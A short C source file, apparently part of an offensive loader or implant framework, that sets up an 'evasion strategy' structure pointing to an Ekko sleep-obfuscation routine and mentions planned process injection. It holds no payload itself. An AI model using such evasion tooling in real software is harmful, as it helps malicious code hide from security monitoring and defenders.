#include "../include/strategy.h"
#include "../include/rtldr_ctx.h"

// Forward declaration of the actual implementation from strategy_ekko.c
// This avoids having to include strategy_ekko.h here, keeping the "factory" clean.
extern BOOL Ekko_ObfuscateSleep(PRTLDR_CTX ctx, DWORD dwMilliseconds);

// Initializes the provided strategy structure with pointers to the chosen
// evasion technique functions.
BOOL Strategy_Initialize(PRTLDR_CTX ctx, PEVASION_STRATEGY strategy) {
    if (!ctx || !strategy) {
        return FALSE;
    }

    // This is the "factory" part.
    // Based on configuration (which we might load from somewhere in the future),
    // we assign the appropriate function pointers.

    // For now, we are hardcoding the "Ekko" strategy for sleep obfuscation.
    strategy->pfnObfuscateSleep = Ekko_ObfuscateSleep;

    // If we had more strategies, we would assign them here.
    // strategy->pfnInjectProcess = SomeInjectionTechnique;

    // All strategies were successfully initialized.
    return TRUE;
} 